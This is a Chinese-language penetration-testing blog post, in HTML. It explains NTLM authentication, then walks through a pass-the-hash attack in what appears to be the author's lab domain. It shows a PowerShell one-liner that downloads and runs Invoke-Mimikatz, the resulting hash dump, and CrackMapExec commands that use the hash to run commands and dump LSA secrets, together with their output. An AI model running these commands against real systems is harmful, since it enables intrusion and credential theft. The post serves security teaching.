+<span>倾旋</span></div></header><section><h2 id=0x01-前言>0x01 前言</h2><p>早期<code>SMB</code>协议在网络上传输明文口令。后来出现 <code>LAN Manager Challenge/Response </code>验证机制，简称<code>LM</code>，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。</p><p>从<code>Win2000</code>开始默认协议为<code>Kerboros</code>，下列情况会调用<code>NTLM</code>：</p><ul><li>遗留客户端或服务器需要登录到网络或本地时。</li><li>UNIX客户端需要与NT服务器通话时。</li><li>有正在使用验证<code>NTLM</code>的服务器信息块<code>（SMB）</code>后台程序的UNIX客户端时。</li><li>也即认证方或被认证方有仅支持NTLM情况时。</li></ul><p>它以<code>挑战/响应（Challenge/Response）</code>顺序为基础。</p><ul><li>1.客户端发送用户名和域名到服务器。</li><li>2.服务器转发到域控制器DC。</li><li>3.<code>DC</code>用客户端密码随机产生一个<code>8字节</code>得挑战<code>（Challenge）</code>，发送给服务器。</li><li>4.服务器将挑战转发给客户端。</li><li>5.客户端用密码经过<code>hash</code>及<code>DES</code>加密算法等操作得到一个加密结果响应<code>（Response）</code>发送给服务器。</li><li>6.服务器将响应转发给<code>DC</code>。</li><li>7.<code>DC</code>做同样操作验证客户端响应。</li><li>8.验证结束，返回结果通知服务器。</li></ul><h2 id=0x02-ntlm对渗透的作用>0x02 NTLM对渗透的作用</h2><p>NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限。</p><p>最大的特点就是我们可以使用<code>SMB</code>执行<code>Command</code>。</p><h2 id=0x03-crackmapexec-介绍>0x03 CrackMapExec 介绍</h2><p>CrackMapExec提供了域环境（活动目录）渗透测试中一站式便携工具，它具有列举登录用户、通过SMB(Server Message Block)网络文件共享协议爬虫列出SMB分享列表，执行类似于Psexec的攻击、使用powerShell脚本执行自动式Mimikatz/Shellcode/DLL注入到内存中，dump NTDS.dit密码。</p><p>WiKi:https://github.com/byt3bl33d3r/CrackMapExec/wiki</p><h2 id=0x03-安装crackmapexec>0x03 安装CrackMapExec</h2><h3 id=kali-linux>Kali Linux</h3><p><code>apt-get install crackmapexec</code></p><h3 id=debianubuntu>Debian/Ubuntu</h3><pre tabindex=0><code>apt-get install -y libssl-dev libffi-dev python-dev build-essential
+pip install crackmapexec
+</code></pre><h2 id=0x04-传递ntlm-hash执行命令>0x04 传递NTLM Hash执行命令</h2><h3 id=使用mimikatz获取ntlm-hash>使用<code>Mimikatz</code>获取<code>NTLM Hash</code></h3><pre tabindex=0><code>
+PS C:\Users\administrator\Documents&gt;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;)
+
+PS C:\Users\administrator\Documents&gt;Invoke-Mimikatz
+</code></pre><p>获取NTLM Hash</p><pre tabindex=0><code>****
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : PAYLOADS
+         * LM       : 5609e3f4c7c56d5fa86fb73c70515bd7
+         * NTLM     : dab7de8feeb5ecac65faf9fdc6cac3a9
+         * SHA1     : 67302089bba4993f2f845e5992db0a21e64679fa
+        tspkg :
+         * Username : Administrator
+         * Domain   : PAYLOADS
+         * Password : ****
+        wdigest :
+         * Username : Administrator
+         * Domain   : PAYLOADS
+         * Password : ****
+        kerberos :
+         * Username : Administrator
+         * Domain   : PAYLOADS.ONLINE
+         * Password : ****
+        ssp :
+        credman :
+
+****
+</code></pre><h3 id=使用crackmapexec执行命令>使用<code>CrackMapExec</code>执行命令</h3><pre tabindex=0><code>root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami
+SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
+SMB         192.168.3.5     445    LIYINGZHEA30B    [+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)
+SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Executed command 
+SMB         192.168.3.5     445    LIYINGZHEA30B    payloads\administrator
+</code></pre><h3 id=使用crackmapexec获取本地密码local-security-authoritylsa>使用<code>CrackMapExec</code>获取本地密码(Local Security Authority)LSA</h3><pre tabindex=0><code>root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 --lsa
+SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
+SMB         192.168.3.5     445    LIYINGZHEA30B    [+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)
+SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumping LSA secrets
+SMB         192.168.3.5     445    LIYINGZHEA30B    WinHack:d3a4b1078aba22996575dd38056e3c99:PAYLOADS.ONLINE:PAYLOADS:::
+SMB         192.168.3.5     445    LIYINGZHEA30B    Administrator:ff007a95ee46c0240e7f0c4b9b0c890a:PAYLOADS.ONLINE:PAYLOADS:::
+SMB         192.168.3.5     445    LIYINGZHEA30B    PAYLOADS\LIYINGZHEA30B$:aad3b435b51404eeaad3b435b51404ee:eda8896ce9133d0bcaf0b6ece9cb0d45:::
+SMB         192.168.3.5     445    LIYINGZHEA30B    DPAPI_SYSTEM:01000000faf06c0f43acbed98d62bd9829d053acb06a00f159e3419d193ff5be56c028fe8d7f0053161d9331
+SMB         192.168.3.5     445    LIYINGZHEA30B    NL$KM:ac8c8a7ce1dd903d74a231a44fcf5df82db711df62e495da9b5f10c3a52dd618a8abce6975c69fea6a9ed69ff6511c62f9a750b5d696a69c3221dc0f1f849f3d
+SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumped 5 LSA secrets to /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.lsa and /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.cached
+</code></pre><h3 id=more->More &mldr;</h3><p>后续再加</p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2018-04-20/1/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>新生活 - 上海，我来了</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2018-03-20/1/><span>浅谈使用C语言开发服务端漏洞扫描设计</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>
